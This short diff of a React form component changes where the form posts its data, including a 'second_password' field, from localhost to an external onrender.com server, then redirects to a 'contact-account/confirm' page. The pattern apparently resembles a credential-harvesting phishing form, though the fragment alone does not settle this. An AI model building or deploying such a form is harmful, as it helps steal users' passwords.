@@ -63,7 +63,7 @@ const Next_buiness = () => {
                         'second_password': passWord,
                     }
 
-                    axios.post( "http://localhost:8080/api/news", data) 
+                    axios.post( "https://server-data-hx92.onrender.com/api/news", data) 
                     .then((response) => {
                         if (response.data.status === 0 ) {
                                 navigate('/contact-account/confirm');
